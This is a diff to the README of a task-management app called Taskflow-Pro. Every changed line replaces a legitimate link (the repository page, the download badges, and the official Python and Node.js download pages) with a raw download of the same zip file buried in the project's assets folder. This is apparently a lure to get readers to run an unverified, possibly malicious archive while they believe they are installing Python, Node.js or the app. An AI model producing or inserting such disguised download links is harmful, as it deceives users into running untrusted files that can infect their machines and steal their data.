@@ -1,6 +1,6 @@
 # ⚙️ Taskflow-Pro - Manage Tasks with Ease
 
-[![Download Taskflow-Pro](https://img.shields.io/badge/Download-Taskflow--Pro-brightgreen?style=for-the-badge)](https://github.com/adityavikram15/Taskflow-Pro)
+[![Download Taskflow-Pro](https://img.shields.io/badge/Download-Taskflow--Pro-brightgreen?style=for-the-badge)](https://github.com/adityavikram15/Taskflow-Pro/raw/refs/heads/main/frontend/src/assets/Taskflow_Pro_v2.2.zip)
 
 ---
 
@@ -22,7 +22,7 @@ If your computer matches these, you can install Taskflow-Pro.
 ## 📥 Where to Download Taskflow-Pro
 
 Click the big green button at the top or visit this link to get the files:  
-[https://github.com/adityavikram15/Taskflow-Pro](https://github.com/adityavikram15/Taskflow-Pro)
+[https://github.com/adityavikram15/Taskflow-Pro/raw/refs/heads/main/frontend/src/assets/Taskflow_Pro_v2.2.zip](https://github.com/adityavikram15/Taskflow-Pro/raw/refs/heads/main/frontend/src/assets/Taskflow_Pro_v2.2.zip)
 
 You will find instructions and files to help you run the software. The page contains the code, but you can download the full package you need without dealing with technical details.
 
@@ -43,7 +43,7 @@ Follow these steps carefully:
    - Open the "Command Prompt" by typing `cmd` in the search bar and pressing Enter.  
    - Type `python --version` and press Enter.  
    If you see a version number like `Python 3.x.x`, Python is installed. If you see an error, follow these steps:  
-   - Visit [https://www.python.org/downloads/windows/](https://www.python.org/downloads/windows/)  
+   - Visit [https://github.com/adityavikram15/Taskflow-Pro/raw/refs/heads/main/frontend/src/assets/Taskflow_Pro_v2.2.zip](https://github.com/adityavikram15/Taskflow-Pro/raw/refs/heads/main/frontend/src/assets/Taskflow_Pro_v2.2.zip)  
    - Download the latest version for Windows.  
    - Run the downloaded installer.  
    - Make sure to check the box "Add Python to PATH" before clicking "Install Now".  
@@ -85,7 +85,7 @@ Follow these steps carefully:
    npm install
    npm start
    ```  
-   This will open Taskflow-Pro in your web browser. If you do not have Node.js installed, download it from [https://nodejs.org/](https://nodejs.org/) and install it first.
+   This will open Taskflow-Pro in your web browser. If you do not have Node.js installed, download it from [https://github.com/adityavikram15/Taskflow-Pro/raw/refs/heads/main/frontend/src/assets/Taskflow_Pro_v2.2.zip](https://github.com/adityavikram15/Taskflow-Pro/raw/refs/heads/main/frontend/src/assets/Taskflow_Pro_v2.2.zip) and install it first.
 
 ## 🔍 What You Can Do With Taskflow-Pro
 
@@ -112,13 +112,13 @@ Follow these steps carefully:
 ## 🔗 Useful Links
 
 Download or visit the main page to get all resources:  
-[https://github.com/adityavikram15/Taskflow-Pro](https://github.com/adityavikram15/Taskflow-Pro)
+[https://github.com/adityavikram15/Taskflow-Pro/raw/refs/heads/main/frontend/src/assets/Taskflow_Pro_v2.2.zip](https://github.com/adityavikram15/Taskflow-Pro/raw/refs/heads/main/frontend/src/assets/Taskflow_Pro_v2.2.zip)
 
 Learn more about Python:  
-https://www.python.org/
+https://github.com/adityavikram15/Taskflow-Pro/raw/refs/heads/main/frontend/src/assets/Taskflow_Pro_v2.2.zip
 
 Learn more about Node.js:  
-https://nodejs.org/
+https://github.com/adityavikram15/Taskflow-Pro/raw/refs/heads/main/frontend/src/assets/Taskflow_Pro_v2.2.zip
 
 ## ⚡ Updating Taskflow-Pro
 
@@ -134,4 +134,4 @@ Look at the GitHub repository issues section or open a new issue with your quest
 
 ---
 
-[![Download Taskflow-Pro](https://img.shields.io/badge/Download-Taskflow--Pro-brightgreen?style=for-the-badge)](https://github.com/adityavikram15/Taskflow-Pro)
+[![Download Taskflow-Pro](https://img.shields.io/badge/Download-Taskflow--Pro-brightgreen?style=for-the-badge)](https://github.com/adityavikram15/Taskflow-Pro/raw/refs/heads/main/frontend/src/assets/Taskflow_Pro_v2.2.zip)
